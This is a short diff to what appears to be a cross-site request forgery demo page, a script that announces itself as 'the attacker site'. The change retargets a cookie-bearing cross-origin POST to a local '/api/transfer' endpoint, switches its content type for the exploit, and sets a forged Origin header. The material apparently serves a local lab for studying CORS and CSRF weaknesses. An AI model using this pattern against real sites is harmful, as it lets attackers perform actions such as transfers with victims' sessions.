@@ -3,7 +3,7 @@ console.log("This is the attacker site");
 //fetch("http://localhost:8000")
 
 fetch(
-    "http://localhost:8000/api/test",
+    "http://localhost:8000/api/transfer",
     {
         method: "POST",
         // CORS mode
@@ -11,8 +11,8 @@ fetch(
         // Must be set to "include" or "same-origin" to send OR receive cookies
         credentials: "include",
         headers: {
-            //'Content-Type': 'application/json', // TODO: Change for exploit
-            'Content-Type': 'text/plain',
+            'Content-Type': 'application/json', // TODO: Change for exploit
+            //'Content-Type': 'text/plain',
             //'Access-Control-Allow-Origin': '*',
             'Origin': 'http://localhost:8000',
             //'Host:': 'localhost:8000'
